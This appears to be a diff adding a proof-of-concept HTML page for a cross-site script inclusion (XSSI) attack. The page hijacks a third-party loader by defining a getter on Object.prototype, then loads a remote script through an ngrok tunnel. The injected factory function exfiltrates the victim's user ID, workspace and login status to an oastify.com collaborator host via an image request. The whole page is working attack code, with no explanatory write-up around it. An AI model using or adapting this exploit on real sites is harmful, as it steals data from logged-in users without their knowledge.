@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html><head></head><body>
+<script>
+var c = 0;
+Object.defineProperty(Object.prototype, 'InsightWebLoaderBootstrap', {
+  get: function() {
+    c++;
+    if (c <= 1) return undefined;
+    return {
+      deps: [],
+      factory: function(exports) {
+        exports.__esModule = true;
+        exports.default = function(ctx) {
+          new Image().src = 'https://adrc1x6n8qtifkjp2k5jt62nkeq5ew5ku.oastify.com/xssi?uid='
+            + encodeURIComponent(ctx.userID || 'none')
+            + '&ws=' + encodeURIComponent(ctx.workspace || 'none')
+            + '&logged=' + ctx.isLoggedIn;
+        };
+      }
+    };
+  },
+  set: function(v) {},
+  configurable: true
+});
+</script>
+<script src="https://ad9e-58-11-11-198.ngrok-free.app/signals/iwl.js?pixel_id=1099511627776"></script>
+</body></html>
